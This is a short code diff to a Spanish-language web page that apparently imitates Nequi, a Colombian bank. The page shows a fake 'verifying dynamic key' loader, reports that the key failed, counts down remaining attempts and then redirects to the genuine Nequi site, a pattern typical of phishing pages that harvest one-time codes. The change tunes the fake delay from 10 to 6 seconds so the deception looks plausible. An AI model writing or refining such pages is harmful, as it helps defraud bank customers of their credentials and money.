@@ -234,7 +234,7 @@
       </div>
     </div>
 
-    <!-- Loader - 10 segundos -->
+    <!-- Loader (6 segundos) -->
     <div class="screen" id="loader">
       <div class="spinner"></div>
       <div style="text-align:center; font-size:18px;">Verificando clave dinámica...</div>
@@ -310,12 +310,11 @@
 
       showScreen('loader');
 
-      // ← Aquí está el cambio principal: 10 segundos de loader
+      // Loader de 6 segundos (entre 5 y 8)
       setTimeout(() => {
         if (currentLength === 4) {
           showScreen('screen3');
         } else {
-          // Clave dinámica ingresada → Error
           attemptsLeft--;
           if (attemptsLeft > 0) {
             document.getElementById('attemptsText').textContent = `Intentos restantes: ${attemptsLeft}`;
@@ -324,7 +323,7 @@
             window.location.href = "https://www.nequi.com.co";
           }
         }
-      }, 10000); // 10 segundos
+      }, 6000);
     }
 
     function retryDynamic() {
